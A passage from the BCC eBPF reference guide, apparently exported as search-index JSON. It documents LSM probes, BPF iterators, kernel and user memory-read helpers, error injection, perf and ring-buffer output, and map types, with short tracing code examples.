non-zero return value will cause the hook to fail and deny the security operation.</p> <p>The following example instruments a hook that denies all future BPF operations: <pre><code>LSM_PROBE(bpf, int cmd, union bpf_attr *attr, unsigned int size)\n{\n    return -EPERM;\n}\n</code></pre></p> <p>This instruments the <code>security_bpf</code> hook and causes it to return <code>-EPERM</code>. Changing <code>return -EPERM</code> to <code>return 0</code> would cause the BPF program to allow the operation instead.</p> <p>LSM probes require at least a 5.7+ kernel with the following configuration options set: - <code>CONFIG_BPF_LSM=y</code> - <code>CONFIG_LSM</code> comma separated string must contain \"bpf\" (for example,   <code>CONFIG_LSM=\"lockdown,yama,bpf\"</code>)</p> <p>Examples in situ: search /tests</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#12-bpf-iterators","title":"12. BPF ITERATORS","text":"<p>Syntax: BPF_ITER(target)</p> <p>This is a macro to define a program signature for a bpf iterator program. The argument target specifies what to iterate for the program.</p> <p>Currently, kernel does not have interface to discover what targets are supported. A good place to find what is supported is in tools/testing/selftests/bpf/prog_test/bpf_iter.c and some sample bpf iter programs are in tools/testing/selftests/bpf/progs with file name prefix bpf_iter.</p> <p>The following example defines a program for target task, which traverses all tasks in the kernel. <pre><code>BPF_ITER(task)\n{\n  struct seq_file *seq = ctx-&gt;meta-&gt;seq;\n  struct task_struct *task = ctx-&gt;task;\n\n  if (task == (void *)0)\n    return 0;\n\n  ... task-&gt;pid, task-&gt;tgid, task-&gt;comm, ...\n  return 0;\n}\n</code></pre></p> <p>BPF iterators are introduced in 5.8 kernel for task, task_file, bpf_map, netlink_sock and ipv6_route . In 5.9, support is added to tcp/udp sockets and bpf map element (hashmap, arraymap and sk_local_storage_map) traversal.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#data","title":"Data","text":""},{"location":"tutorials/bcc-documents/reference_guide_en/#1-bpf_probe_read_kernel","title":"1. bpf_probe_read_kernel()","text":"<p>Syntax: <code>int bpf_probe_read_kernel(void *dst, int size, const void *src)</code></p> <p>Return: 0 on success</p> <p>This copies size bytes from kernel address space to the BPF stack, so that BPF can later operate on it. For safety, all kernel memory reads must pass through bpf_probe_read_kernel(). This happens automatically in some cases, such as dereferencing kernel variables, as bcc will rewrite the BPF program to include the necessary bpf_probe_read_kernel().</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-bpf_probe_read_kernel_str","title":"2. bpf_probe_read_kernel_str()","text":"<p>Syntax: <code>int bpf_probe_read_kernel_str(void *dst, int size, const void *src)</code></p> <p>Return:   - &gt; 0 length of the string including the trailing NULL on success   - \\&lt; 0 error</p> <p>This copies a <code>NULL</code> terminated string from kernel address space to the BPF stack, so that BPF can later operate on it. In case the string length is smaller than size, the target is not padded with further <code>NULL</code> bytes. In case the string length is larger than size, just <code>size - 1</code> bytes are copied and the last byte is set to <code>NULL</code>.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-bpf_ktime_get_ns","title":"3. bpf_ktime_get_ns()","text":"<p>Syntax: <code>u64 bpf_ktime_get_ns(void)</code></p> <p>Return: u64 number of nanoseconds. Starts at system boot time but stops during suspend.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#4-bpf_get_current_pid_tgid","title":"4. bpf_get_current_pid_tgid()","text":"<p>Syntax: <code>u64 bpf_get_current_pid_tgid(void)</code></p> <p>Return: <code>current-&gt;tgid &lt;&lt; 32 | current-&gt;pid</code></p> <p>Returns the process ID in the lower 32 bits (kernel's view of the PID, which in user space is usually presented as the thread ID), and the thread group ID in the upper 32 bits (what user space often thinks of as the PID). By directly setting this to a u32, we discard the upper 32 bits.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#5-bpf_get_current_uid_gid","title":"5. bpf_get_current_uid_gid()","text":"<p>Syntax: <code>u64 bpf_get_current_uid_gid(void)</code></p> <p>Return: <code>current_gid &lt;&lt; 32 | current_uid</code></p> <p>Returns the user ID and group IDs.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#6-bpf_get_current_comm","title":"6. bpf_get_current_comm()","text":"<p>Syntax: <code>bpf_get_current_comm(char *buf, int size_of_buf)</code></p> <p>Return: 0 on success</p> <p>Populates the first argument address with the current process name. It should be a pointer to a char array of at least size TASK_COMM_LEN, which is defined in linux/sched.h. For example:</p> <pre><code>#include &lt;linux/sched.h&gt;\n\nint do_trace(struct pt_regs *ctx) {\n    char comm[TASK_COMM_LEN];\n    bpf_get_current_comm(&amp;comm, sizeof(comm));\n[...]\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#7-bpf_get_current_task","title":"7. bpf_get_current_task()","text":"<p>Syntax: <code>bpf_get_current_task()</code></p> <p>Return: current task as a pointer to struct task_struct.</p> <p>Returns a pointer to the current task's task_struct object. This helper can be used to compute the on-CPU time for a process, identify kernel threads, get the current CPU's run queue, or retrieve many other pieces of information.</p> <p>With Linux 4.13, due to issues with field randomization, you may need two #define directives before the includes: <pre><code>#define randomized_struct_fields_start  struct {\n#define randomized_struct_fields_end    };\n#include &lt;linux/sched.h&gt;\n\nint do_trace(void *ctx) {\n    struct task_struct *t = (struct task_struct *)bpf_get_current_task();\n[...]\n</code></pre></p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#8-bpf_log2l","title":"8. bpf_log2l()","text":"<p>Syntax: <code>unsigned int bpf_log2l(unsigned long v)</code></p> <p>Returns the log-2 of the provided value. This is often used to create indexes for histograms, to construct power-of-2 histograms.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#9-bpf_get_prandom_u32","title":"9. bpf_get_prandom_u32()","text":"<p>Syntax: <code>u32 bpf_get_prandom_u32()</code></p> <p>Returns a pseudo-random u32.</p> <p>Example in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#10-bpf_probe_read_user","title":"10. bpf_probe_read_user()","text":"<p>Syntax: <code>int bpf_probe_read_user(void *dst, int size, const void *src)</code></p> <p>Return: 0 on success</p> <p>This attempts to safely read size bytes from user address space to the BPF stack, so that BPF can later operate on it. For safety, all user address space memory reads must pass through bpf_probe_read_user().</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#11-bpf_probe_read_user_str","title":"11. bpf_probe_read_user_str()","text":"<p>Syntax: <code>int bpf_probe_read_user_str(void *dst, int size, const void *src)</code></p> <p>Return:   - &gt; 0 length of the string including the trailing NULL on success   - \\&lt; 0 error</p> <p>This copies a <code>NULL</code> terminated string from user address space to the BPF stack, so that BPF can later operate on it. In case the string length is smaller than size, the target is not padded with further <code>NULL</code> bytes. In case the string length is larger than size, just <code>size - 1</code> bytes are copied and the last byte is set to <code>NULL</code>.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#12-bpf_get_ns_current_pid_tgid","title":"12. bpf_get_ns_current_pid_tgid()","text":"<p>Syntax: <code>u32 bpf_get_ns_current_pid_tgid(u64 dev, u64 ino, struct bpf_pidns_info* nsdata, u32 size)</code></p> <p>Values for pid and tgid as seen from the current namespace will be returned in nsdata.</p> <p>Return 0 on success, or one of the following in case of failure:</p> <ul> <li> <p>-EINVAL if dev and inum supplied don't match dev_t and inode number with nsfs of current task, or if dev conversion to dev_t lost high bits.</p> </li> <li> <p>-ENOENT if pidns does not exists for the current task.</p> </li> </ul> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#debugging","title":"Debugging","text":""},{"location":"tutorials/bcc-documents/reference_guide_en/#1-bpf_override_return","title":"1. bpf_override_return()","text":"<p>Syntax: <code>int bpf_override_return(struct pt_regs *, unsigned long rc)</code></p> <p>Return: 0 on success</p> <p>When used in a program attached to a function entry kprobe, causes the execution of the function to be skipped, immediately returning <code>rc</code> instead. This is used for targeted error injection.</p> <p>bpf_override_return will only work when the kprobed function is whitelisted to allow error injections. Whitelisting entails tagging a function with <code>ALLOW_ERROR_INJECTION()</code> in the kernel source tree; see <code>io_ctl_init</code> for an example. If the kprobed function is not whitelisted, the bpf program will fail to attach with <code>ioctl(PERF_EVENT_IOC_SET_BPF): Invalid argument</code></p> <pre><code>int kprobe__io_ctl_init(void *ctx) {\n    bpf_override_return(ctx, -ENOMEM);\n    return 0;\n}\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide_en/#output","title":"Output","text":""},{"location":"tutorials/bcc-documents/reference_guide_en/#1-bpf_trace_printk","title":"1. bpf_trace_printk()","text":"<p>Syntax: <code>int bpf_trace_printk(const char *fmt, ...)</code></p> <p>Return: 0 on success</p> <p>A simple kernel facility for printf() to the common trace_pipe (/sys/kernel/debug/tracing/trace_pipe). This is ok for some quick examples, but has limitations: 3 args max, 1 %s only, and trace_pipe is globally shared, so concurrent programs will have clashing output. A better interface is via BPF_PERF_OUTPUT(). Note that calling this helper is made simpler than the original kernel version, which has <code>fmt_size</code> as the second parameter.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-bpf_perf_output","title":"2. BPF_PERF_OUTPUT","text":"<p>Syntax: <code>BPF_PERF_OUTPUT(name)</code></p> <p>Creates a BPF table for pushing out custom event data to user space via a perf ring buffer. This is the preferred method for pushing per-event data to user space.</p> <p>For example:</p> <pre><code>struct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\nBPF_PERF_OUTPUT(events);\n\nint hello(struct pt_regs *ctx) {\n    struct data_t data = {};\n\n    data.pid = bpf_get_current_pid_tgid();\n    data.ts = bpf_ktime_get_ns();\n    bpf_get_current_comm(&amp;data.comm, sizeof(data.comm));\n\n    events.perf_submit(ctx, &amp;data, sizeof(data));\n\n    return 0;\n}\n</code></pre> <p>The output table is named <code>events</code>, and data is pushed to it via <code>events.perf_submit()</code>.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-perf_submit","title":"3. perf_submit()","text":"<p>Syntax: <code>int perf_submit((void *)ctx, (void *)data, u32 data_size)</code></p> <p>Return: 0 on success</p> <p>A method of a BPF_PERF_OUTPUT table, for submitting custom event data to user space. See the BPF_PERF_OUTPUT entry. (This ultimately calls bpf_perf_event_output().)</p> <p>The <code>ctx</code> parameter is provided in kprobes or kretprobes. For <code>SCHED_CLS</code> or <code>SOCKET_FILTER</code> programs, the <code>struct __sk_buff *skb</code> must be used instead.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#4-perf_submit_skb","title":"4. perf_submit_skb()","text":"<p>Syntax: <code>int perf_submit_skb((void *)ctx, u32 packet_size, (void *)data, u32 data_size)</code></p> <p>Return: 0 on success</p> <p>A method of a BPF_PERF_OUTPUT table available in networking program types, for submitting custom event data to user space, along with the first <code>packet_size</code> bytes of the packet buffer. See the BPF_PERF_OUTPUT entry. (This ultimately calls bpf_perf_event_output().)</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#5-bpf_ringbuf_output","title":"5. BPF_RINGBUF_OUTPUT","text":"<p>Syntax: <code>BPF_RINGBUF_OUTPUT(name, page_cnt)</code></p> <p>Creates a BPF table for pushing out custom event data to user space via a ringbuf ring buffer. <code>BPF_RINGBUF_OUTPUT</code> has several advantages over <code>BPF_PERF_OUTPUT</code>, summarized as follows:</p> <ul> <li>Buffer is shared across all CPUs, meaning no per-CPU allocation</li> <li>Supports two APIs for BPF programs<ul> <li><code>map.ringbuf_output()</code> works like <code>map.perf_submit()</code> (covered in ringbuf_output)</li> <li><code>map.ringbuf_reserve()</code>/<code>map.ringbuf_submit()</code>/<code>map.ringbuf_discard()</code>   split the process of reserving buffer space and submitting events into two steps   (covered in ringbuf_reserve, ringbuf_submit, ringbuf_discard)</li> </ul> </li> <li>BPF APIs do not require access to a CPU ctx argument</li> <li>Superior performance and latency in userspace thanks to a shared ring buffer manager</li> <li>Supports two ways of consuming data in userspace</li> </ul> <p>Starting in Linux 5.8, this should be the preferred method for pushing per-event data to user space.</p> <p>Example of both APIs:</p> <pre><code>struct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\n\n// Creates a ringbuf called events with 8 pages of space, shared across all CPUs\nBPF_RINGBUF_OUTPUT(events, 8);\n\nint first_api_example(struct pt_regs *ctx) {\n    struct data_t data = {};\n\n    data.pid = bpf_get_current_pid_tgid();\n    data.ts = bpf_ktime_get_ns();\n    bpf_get_current_comm(&amp;data.comm, sizeof(data.comm));\n\n    events.ringbuf_output(&amp;data, sizeof(data), 0 /* flags */);\n\n    return 0;\n}\n\nint second_api_example(struct pt_regs *ctx) {\n    struct data_t *data = events.ringbuf_reserve(sizeof(struct data_t));\n    if (!data) { // Failed to reserve space\n        return 1;\n    }\n\n    data-&gt;pid = bpf_get_current_pid_tgid();\n    data-&gt;ts = bpf_ktime_get_ns();\n    bpf_get_current_comm(&amp;data-&gt;comm, sizeof(data-&gt;comm));\n\n    events.ringbuf_submit(data, 0 /* flags */);\n\n    return 0;\n}\n</code></pre> <p>The output table is named <code>events</code>. Data is allocated via <code>events.ringbuf_reserve()</code> and pushed to it via <code>events.ringbuf_submit()</code>.</p> <p>Examples in situ:  search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#6-ringbuf_output","title":"6. ringbuf_output()","text":"<p>Syntax: <code>int ringbuf_output((void *)data, u64 data_size, u64 flags)</code></p> <p>Return: 0 on success</p> <p>Flags:  - <code>BPF_RB_NO_WAKEUP</code>: Do not sent notification of new data availability  - <code>BPF_RB_FORCE_WAKEUP</code>: Send notification of new data availability unconditionally</p> <p>A method of the BPF_RINGBUF_OUTPUT table, for submitting custom event data to user space. This method works like <code>perf_submit()</code>, although it does not require a ctx argument.</p> <p>Examples in situ:  search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#7-ringbuf_reserve","title":"7. ringbuf_reserve()","text":"<p>Syntax: <code>void* ringbuf_reserve(u64 data_size)</code></p> <p>Return: Pointer to data struct on success, NULL on failure</p> <p>A method of the BPF_RINGBUF_OUTPUT table, for reserving space in the ring buffer and simultaneously allocating a data struct for output. Must be used with one of <code>ringbuf_submit</code> or <code>ringbuf_discard</code>.</p> <p>Examples in situ:  search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#8-ringbuf_submit","title":"8. ringbuf_submit()","text":"<p>Syntax: <code>void ringbuf_submit((void *)data, u64 flags)</code></p> <p>Return: Nothing, always succeeds</p> <p>Flags:  - <code>BPF_RB_NO_WAKEUP</code>: Do not sent notification of new data availability  - <code>BPF_RB_FORCE_WAKEUP</code>: Send notification of new data availability unconditionally</p> <p>A method of the BPF_RINGBUF_OUTPUT table, for submitting custom event data to user space. Must be preceded by a call to <code>ringbuf_reserve()</code> to reserve space for the data.</p> <p>Examples in situ:  search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#9-ringbuf_discard","title":"9. ringbuf_discard()","text":"<p>Syntax: <code>void ringbuf_discard((void *)data, u64 flags)</code></p> <p>Return: Nothing, always succeeds</p> <p>Flags:  - <code>BPF_RB_NO_WAKEUP</code>: Do not sent notification of new data availability  - <code>BPF_RB_FORCE_WAKEUP</code>: Send notification of new data availability unconditionally</p> <p>A method of the BPF_RINGBUF_OUTPUT table, for discarding custom event data; userspace ignores the data associated with the discarded event. Must be preceded by a call to <code>ringbuf_reserve()</code> to reserve space for the data.</p> <p>Examples in situ:  search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#maps","title":"Maps","text":"<p>Maps are BPF data stores, and are the basis for higher level object types including tables, hashes, and histograms.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#1-bpf_table","title":"1. BPF_TABLE","text":"<p>Syntax: <code>BPF_TABLE(_table_type, _key_type, _leaf_type, _name, _max_entries)</code></p> <p>Creates a map named <code>_name</code>. Most of the time this will be used via higher-level macros, like BPF_HASH, BPF_ARRAY, BPF_HISTOGRAM, etc.</p> <p><code>BPF_F_TABLE</code> is a variant that takes a flag in the last parameter. <code>BPF_TABLE(https://github.com/iovisor/bcc/tree/master.)</code> is actually a wrapper to <code>BPF_F_TABLE(https://github.com/iovisor/bcc/tree/master., 0 /* flag */)</code>.</p> <p>Methods (covered later): map.lookup(), map.lookup_or_try_init(), map.delete(), map.update(), map.insert(), map.increment().</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#pinned-maps","title":"Pinned Maps","text":"<p>Syntax: <code>BPF_TABLE_PINNED(_table_type, _key_type, _leaf_type, _name, _max_entries, \"/sys/fs/bpf/xyz\")</code></p> <p>Create a new map if it doesn't exist and pin it to the bpffs as a FILE, otherwise use the map that was pinned to the bpffs. The type information is not enforced and the actual map type depends on the map that got pinned to the location.</p> <p>For example:</p> <pre><code>BPF_TABLE_PINNED(\"hash\", u64, u64, ids, 1024, \"/sys/fs/bpf/ids\");\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-bpf_hash","title":"2. BPF_HASH","text":"<p>Syntax: <code>BPF_HASH(name [, key_type [, leaf_type [, size]]])</code></p> <p>Creates a hash map (associative array) named <code>name</code>, with optional parameters.</p> <p>Defaults: <code>BPF_HASH(name, key_type=u64, leaf_type=u64, size=10240)</code></p> <p>For example:</p> <pre><code>BPF_HASH(start, struct request *);\n</code></pre> <p>This creates a hash named <code>start</code> where the key is a <code>struct request *</code>, and the value defaults to u64. This hash is used by the disksnoop.py example for saving timestamps for each I/O request, where the key is the pointer to struct request, and the value is the timestamp.</p> <p>This is a wrapper macro for <code>BPF_TABLE(\"hash\", ...)</code>.</p> <p>Methods (covered later): map.lookup(), map.lookup_or_try_init(), map.delete(), map.update(), map.insert(), map.increment().</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-bpf_array","title":"3. BPF_ARRAY","text":"<p>Syntax: <code>BPF_ARRAY(name [, leaf_type [, size]])</code></p> <p>Creates an int-indexed array which is optimized for fastest lookup and update, named <code>name</code>, with optional parameters.</p> <p>Defaults: <code>BPF_ARRAY(name, leaf_type=u64, size=10240)</code></p> <p>For example:</p> <pre><code>BPF_ARRAY(counts, u64, 32);\n</code></pre> <p>This creates an array named <code>counts</code> where with 32 buckets and 64-bit integer values. This array is used by the funccount.py example for saving call count of each function.</p> <p>This is a wrapper macro for <code>BPF_TABLE(\"array\", ...)</code>.</p> <p>Methods (covered later): map.lookup(), map.update(), map.increment(). Note that all array elements are pre-allocated with zero values and can not be deleted.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#4-bpf_histogram","title":"4. BPF_HISTOGRAM","text":"<p>Syntax: <code>BPF_HISTOGRAM(name [, key_type [, size ]])</code></p> <p>Creates a histogram map named <code>name</code>, with optional parameters.</p> <p>Defaults: <code>BPF_HISTOGRAM(name, key_type=int, size=64)</code></p> <p>For example:</p> <pre><code>BPF_HISTOGRAM(dist);\n</code></pre> <p>This creates a histogram named <code>dist</code>, which defaults to 64 buckets indexed by keys of type int.</p> <p>This is a wrapper macro for <code>BPF_TABLE(\"histgram\", ...)</code>.</p> <p>Methods (covered later): map.increment().</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#5-bpf_stack_trace","title":"5. BPF_STACK_TRACE","text":"<p>Syntax: <code>BPF_STACK_TRACE(name, max_entries)</code></p> <p>Creates stack trace map named <code>name</code>, with a maximum entry count provided. These maps are used to store stack traces.</p> <p>For example:</p> <pre><code>BPF_STACK_TRACE(stack_traces, 1024);\n</code></pre> <p>This creates stack trace map named <code>stack_traces</code>, with a maximum number of stack trace entries of 1024.</p> <p>This is a wrapper macro for <code>BPF_TABLE(\"stacktrace\", ...)</code>.</p> <p>Methods (covered later): map.get_stackid().</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#6-bpf_perf_array","title":"6. BPF_PERF_ARRAY","text":"<p>Syntax: <code>BPF_PERF_ARRAY(name, max_entries)</code></p> <p>Creates perf array named <code>name</code>, with a maximum entry count provided, which must be equal to the number of system cpus. These maps are used to fetch hardware performance counters.</p> <p>For example:</p> <pre><code>text=\"\"\"\nBPF_PERF_ARRAY(cpu_cycles, NUM_CPUS);\n\"\"\"\nb = bcc.BPF(text=text, cflags=[\"-DNUM_CPUS=%d\" % multiprocessing.cpu_count()])\nb[\"cpu_cycles\"].open_perf_event(b[\"cpu_cycles\"].HW_CPU_CYCLES)\n</code></pre> <p>This creates a perf array named <code>cpu_cycles</code>, with number of entries equal to the number of cpus/cores. The array is configured so that later calling map.perf_read() will return a hardware-calculated counter of the number of cycles elapsed from some point in the past. Only one type of hardware counter may be configured per table at a time.</p> <p>Methods (covered later): map.perf_read().</p> <p>Examples in situ: search /tests</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#7-bpf_percpu_hash","title":"7. BPF_PERCPU_HASH","text":"<p>Syntax: <code>BPF_PERCPU_HASH(name [, key_type [, leaf_type [, size]]])</code></p> <p>Creates NUM_CPU int-indexed hash maps (associative arrays) named <code>name</code>, with optional parameters. Each CPU will have a separate copy of this array. The copies are not kept synchronized in any way.</p> <p>Note that due to limits defined in the kernel (in linux/mm/percpu.c), the <code>leaf_type</code> cannot have a size of more than 32KB. In other words, <code>BPF_PERCPU_HASH</code> elements cannot be larger than 32KB in size.</p> <p>Defaults: <code>BPF_PERCPU_HASH(name, key_type=u64, leaf_type=u64, size=10240)</code></p> <p>For example:</p> <pre><code>BPF_PERCPU_HASH(start, struct request *);\n</code></pre> <p>This creates NUM_CPU hashes named <code>start</code> where the key is a <code>struct request *</code>, and the value defaults to u64.</p> <p>This is a wrapper macro for <code>BPF_TABLE(\"percpu_hash\", ...)</code>.</p> <p>Methods (covered later): map.lookup(), map.lookup_or_try_init(), map.delete(), map.update(), map.insert(), map.increment().</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#8-bpf_percpu_array","title":"8. BPF_PERCPU_ARRAY","text":"<p>Syntax: <code>BPF_PERCPU_ARRAY(name [, leaf_type [, size]])</code></p> <p>Creates NUM_CPU int-indexed arrays which are optimized for fastest lookup and update, named <code>name</code>, with optional parameters. Each CPU will have a separate copy of this array. The copies are not kept synchronized in any way.</p> <p>Note that due to limits defined in the kernel (in linux/mm/percpu.c), the <code>leaf_type</code> cannot have a size of more than 32KB. In other words, <code>BPF_PERCPU_ARRAY</code> elements cannot be larger than 32KB in size.</p> <p>Defaults: <code>BPF_PERCPU_ARRAY(name, leaf_type=u64, size=10240)</code></p> <p>For example:</p> <pre><code>BPF_PERCPU_ARRAY(counts, u64, 32);\n</code></pre> <p>This creates NUM_CPU arrays named <code>counts</code> where with 32 buckets and 64-bit integer values.</p> <p>This is a wrapper macro for <code>BPF_TABLE(\"percpu_array\", ...)</code>.</p> <p>Methods (covered later): map.lookup(), map.update(), map.increment(). Note that all array elements are pre-allocated with zero values and can not be deleted.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#9-bpf_lpm_trie","title":"9. BPF_LPM_TRIE","text":"<p>Syntax: <code>BPF_LPM_TRIE(name [, key_type [, leaf_type [, size]]])</code></p> <p>Creates a longest prefix match trie map named <code>name</code>, with optional parameters.</p> <p>Defaults: <code>BPF_LPM_TRIE(name, key_type=u64, leaf_type=u64, size=10240)</code></p> <p>For example:</p> <pre><code>BPF_LPM_TRIE(trie, struct key_v6);\n</code></pre> <p>This creates an LPM trie map named <code>trie</code> where the key is a <code>struct key_v6</code>, and the value defaults to u64.</p> <p>This is a wrapper macro to <code>BPF_F_TABLE(\"lpm_trie\", ..., BPF_F_NO_PREALLOC)</code>.</p> <p>Methods (covered later): map.lookup(), map.lookup_or_try_init(), map.delete(), map.update(), map.insert(), map.increment().</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#10-bpf_prog_array","title":"10. BPF_PROG_ARRAY","text":"<p>Syntax: <code>BPF_PROG_ARRAY(name, size)</code></p> <p>This creates a program array named <code>name</code> with <code>size</code> entries. Each entry of the array is either a file descriptor to a bpf program or <code>NULL</code>. The array acts as a jump table so that bpf programs can \"tail-call\" other bpf programs.</p> <p>This is a wrapper macro for <code>BPF_TABLE(\"prog\", ...)</code>.</p> <p>Methods (covered later): map.call().</p> <p>Examples in situ: search /examples, search /tests, assign fd</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#11-bpf_devmap","title":"11. BPF_DEVMAP","text":"<p>Syntax: <code>BPF_DEVMAP(name, size)</code></p> <p>This creates a device map named <code>name</code> with <code>size</code> entries. Each entry of the map is an <code>ifindex</code> to a network interface. This map is only used in XDP.</p> <p>For example: <pre><code>BPF_DEVMAP(devmap, 10);\n</code></pre></p> <p>Methods (covered later): map.redirect_map().</p> <p>Examples in situ: search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#12-bpf_cpumap","title":"12. BPF_CPUMAP","text":"<p>Syntax: <code>BPF_CPUMAP(name, size)</code></p> <p>This creates a cpu map named <code>name</code> with <code>size</code> entries. The index of the map represents the CPU id and each entry is the size of the ring buffer allocated for the CPU. This map is only used in XDP.</p> <p>For example: <pre><code>BPF_CPUMAP(cpumap, 16);\n</code></pre></p> <p>Methods (covered later): map.redirect_map().</p> <p>Examples in situ: search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#13-bpf_xskmap","title":"13. BPF_XSKMAP","text":"<p>Syntax: <code>BPF_XSKMAP(name, size [, \"/sys/fs/bpf/xyz\"])</code></p> <p>This creates a xsk map named <code>name</code> with <code>size</code> entries and pin it to the bpffs as a FILE. Each entry represents one NIC's queue id. This map is only used in XDP to redirect packet to an AF_XDP socket. If the AF_XDP socket is binded to a queue which is different than the current packet's queue id, the packet will be dropped. For kernel v5.3 and latter, <code>lookup</code> method is available and can be used to check whether and AF_XDP socket is available for the current packet's queue id. More details at AF_XDP.</p> <p>For example: <pre><code>BPF_XSKMAP(xsks_map, 8);\n</code></pre></p> <p>Methods (covered later): map.redirect_map(). map.lookup()</p> <p>Examples in situ: search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#14-bpf_array_of_maps","title":"14. BPF_ARRAY_OF_MAPS","text":"<p>Syntax: <code>BPF_ARRAY_OF_MAPS(name, inner_map_name, size)</code></p> <p>This creates an array map with a map-in-map type (BPF_MAP_TYPE_HASH_OF_MAPS) map named <code>name</code> with <code>size</code> entries. The inner map meta data is provided by map <code>inner_map_name</code> and can be most of array or hash maps except <code>BPF_MAP_TYPE_PROG_ARRAY</code>, <code>BPF_MAP_TYPE_CGROUP_STORAGE</code> and <code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>.</p> <p>For example: <pre><code>BPF_TABLE(\"hash\", int, int, ex1, 1024);\nBPF_TABLE(\"hash\", int, int, ex2, 1024);\nBPF_ARRAY_OF_MAPS(maps_array, \"ex1\", 10);\n</code></pre></p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#15-bpf_hash_of_maps","title":"15. BPF_HASH_OF_MAPS","text":"<p>Syntax: <code>BPF_HASH_OF_MAPS(name, key_type, inner_map_name, size)</code></p> <p>This creates a hash map with a map-in-map type (BPF_MAP_TYPE_HASH_OF_MAPS) map named <code>name</code> with <code>size</code> entries. The inner map meta data is provided by map <code>inner_map_name</code> and can be most of array or hash maps except <code>BPF_MAP_TYPE_PROG_ARRAY</code>, <code>BPF_MAP_TYPE_CGROUP_STORAGE</code> and <code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>.</p> <p>For example: <pre><code>BPF_ARRAY(ex1, int, 1024);\nBPF_ARRAY(ex2, int, 1024);\nBPF_HASH_OF_MAPS(maps_hash, struct custom_key, \"ex1\", 10);\n</code></pre></p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#16-bpf_stack","title":"16. BPF_STACK","text":"<p>Syntax: <code>BPF_STACK(name, leaf_type, max_entries[, flags])</code></p> <p>Creates a stack named <code>name</code> with value type <code>leaf_type</code> and max entries <code>max_entries</code>. Stack and Queue maps are only available from Linux 4.20+.</p> <p>For example:</p> <pre><code>BPF_STACK(stack, struct event, 10240);\n</code></pre> <p>This creates a stack named <code>stack</code> where the value type is <code>struct event</code>, that holds up to 10240 entries.</p> <p>Methods (covered later): map.push(), map.pop(), map.peek().</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#17-bpf_queue","title":"17. BPF_QUEUE","text":"<p>Syntax: <code>BPF_QUEUE(name, leaf_type, max_entries[, flags])</code></p> <p>Creates a queue named <code>name</code> with value type <code>leaf_type</code> and max entries <code>max_entries</code>. Stack and Queue maps are only available from Linux 4.20+.</p> <p>For example:</p> <pre><code>BPF_QUEUE(queue, struct event, 10240);\n</code></pre> <p>This creates a queue named <code>queue</code> where the value type is <code>struct event</code>, that holds up to 10240 entries.</p> <p>Methods (covered later): map.push(), map.pop(), map.peek().</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#18-bpf_sockhash","title":"18. BPF_SOCKHASH","text":"<p>Syntax: <code>BPF_SOCKHASH(name[, key_type [, max_entries)</code></p> <p>Creates a hash named <code>name</code>, with optional parameters. sockhash is only available from Linux 4.18+.</p> 